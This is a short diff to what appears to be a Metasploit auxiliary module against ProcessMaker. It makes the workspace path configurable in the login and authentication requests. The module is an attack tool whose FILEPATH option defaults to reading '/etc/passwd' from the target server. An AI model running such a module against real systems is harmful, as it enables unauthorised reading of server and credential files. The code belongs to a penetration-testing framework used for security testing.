@@ -44,13 +44,14 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new("TARGETURI", [true, 'The relative URI of ProcessMaker', '/']),
+        OptString.new('PM_WORKSPACE', [true, 'The ProcessMaker workspace to use', 'workflow']),
         OptString.new('FILEPATH', [true, 'The file path on the server to read', '/etc/passwd'])
       ], self.class)
   end
 
   def run
     res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/login')
+      'uri' => normalize_uri(target_uri.path, "/sys#{datastore['PM_WORKSPACE']}/en/neoclassic/login/login")
     })
 
     cookie = res.get_cookies
@@ -68,12 +69,12 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/authentication.php'),
+      'uri' => normalize_uri(target_uri.path, "/sys#{datastore['PM_WORKSPACE']}/en/neoclassic/login/authentication.php"),
       'data' => data.to_s,
       'ctype' => 'multipart/form-data; boundary=' + data.bound,
       'cookie' => cookie,
       'headers' => {
-        'Referer' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/login')
+        'Referer' => normalize_uri(target_uri.path, "/sys#{datastore['PM_WORKSPACE']}/en/neoclassic/login/login")
       }
     })
 
